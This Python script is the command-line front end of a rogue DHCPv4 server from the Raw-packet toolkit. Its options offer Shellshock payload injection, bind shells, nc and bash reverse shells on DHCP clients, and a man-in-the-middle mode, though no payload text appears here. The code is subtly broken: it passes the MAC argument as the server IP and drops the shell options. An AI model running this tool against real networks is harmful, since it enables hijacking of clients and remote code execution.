#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
dhcpv4_server.py: DHCPv4 server (dhcpv4_server)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Servers.dhcpv4_server import DHCPv4Server
from argparse import ArgumentParser, RawDescriptionHelpFormatter
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
__script_name__ = 'DHCPv4 server (dhcpv4_server)'
# endregion


# region Main function
def main():

    # region Init Raw-packet classes
    base: Base = Base(admin_only=True, available_platforms=['Linux', 'Darwin', 'Windows'])
    # endregion

    # region Parse script arguments
    parser: ArgumentParser = ArgumentParser(description=base.get_banner(__script_name__),
                                            formatter_class=RawDescriptionHelpFormatter)
    parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
    parser.add_argument('-f', '--first_offer_ip', type=str, help='Set first client ip for offering', default=None)
    parser.add_argument('-l', '--last_offer_ip', type=str, help='Set last client ip for offering', default=None)
    parser.add_argument('-m', '--target_mac', type=str, help='Set target MAC address', default=None)
    parser.add_argument('-t', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac',
                        default=None)
    parser.add_argument('--netmask', type=str, help='Set network mask', default=None)
    parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server MAC address, if not set use your MAC address',
                        default=None)
    parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your IP address',
                        default=None)
    parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address',
                        default=None)
    parser.add_argument('--dns', type=str, help='Set DNS server IP address, if not set use your ip address',
                        default=None)
    parser.add_argument('--tftp', type=str, help='Set TFTP server IP address', default=None)
    parser.add_argument('--wins', type=str, help='Set WINS server IP address', default=None)
    parser.add_argument('--domain', type=str, help='Set domain name for search, default=local', default='local')
    parser.add_argument('--lease_time', type=int, help='Set lease time, default=172800', default=172800)
    parser.add_argument('--discover', action='store_true', help='Send DHCP discover packets in the background thread')
    parser.add_argument('-O', '--shellshock_option_code', type=int,
                        help='Set dhcp option code for inject shellshock payload, default=114', default=114)
    parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
    parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
    parser.add_argument('-p', '--bind_port', type=int, help='Set port for listen bind shell (default=1234)',
                        default=1234)
    parser.add_argument('-N', '--nc_reverse_shell', action='store_true',
                        help='Use nc reverse tcp shell in DHCP client')
    parser.add_argument('-E', '--nce_reverse_shell', action='store_true',
                        help='Use nc -e reverse tcp shell in DHCP client')
    parser.add_argument('-R', '--bash_reverse_shell', action='store_true',
                        help='Use bash reverse tcp shell in DHCP client')
    parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)',
                        default=443)
    parser.add_argument('-n', '--without_network', action='store_true', help='Do not add network configure in payload')
    parser.add_argument('-B', '--without_base64', action='store_true', help='Do not use base64 encode in payload')
    parser.add_argument('--ip_path', type=str,
                        help='Set path to "ip" in shellshock payload, default = /bin/', default='/bin/')
    parser.add_argument('--iface_name', type=str,
                        help='Set iface name in shellshock payload, default = eth0', default='eth0')
    parser.add_argument('--broadcast_response', action='store_true', help='Send broadcast response')
    parser.add_argument('--dnsop', action='store_true', help='Do not send DHCP OFFER packets')
    parser.add_argument('--exit', action='store_true', help='Exit on success MiTM attack')
    parser.add_argument('--apple', action='store_true', help='Add delay before send DHCP ACK')
    parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
    args = parser.parse_args()
    # endregion

    # region Print banner if argument quit is not set
    if not args.quiet:
        base.print_banner(__script_name__)
    # endregion

    # region Get your network settings
    current_network_interface: str = \
        base.network_interface_selection(interface_name=args.interface,
                                         message='Please select a network interface for ' +
                                                 __script_name__ + ' from table: ')
    # endregion

    try:
        dhcpv4_server: DHCPv4Server = DHCPv4Server(network_interface=current_network_interface)
        dhcpv4_server.start(target_mac_address=args.target_mac,
                            target_ipv4_address=args.target_ip,
                            first_offer_ipv4_address=args.first_offer_ip,
                            last_offer_ipv4_address=args.last_offer_ip,
                            dhcp_server_mac_address=args.dhcp_mac,
                            dhcp_server_ipv4_address=args.dhcp_mac,
                            dns_server_ipv4_address=args.dns,
                            tftp_server_ipv4_address=args.tftp,
                            wins_server_ipv4_address=args.wins,
                            router_ipv4_address=args.router,
                            domain_search=args.domain,
                            ipv4_network_mask=args.netmask,
                            lease_time=args.lease_time,
                            shellshock_option_code=args.shellshock_option_code,
                            send_dhcp_discover_packets=args.discover,
                            send_dhcp_offer_packets=not args.dnsop,
                            send_broadcast_dhcp_response=args.broadcast_response,
                            exit_on_success=args.exit,
                            apple=args.apple,
                            quiet=args.quiet)

    except KeyboardInterrupt:
        base.print_info('Exit')
        exit(0)

    except AssertionError as Error:
        base.print_error(Error.args[0])
        exit(1)

# endregion


# region Call Main function
if __name__ == "__main__":
    main()
# endregion
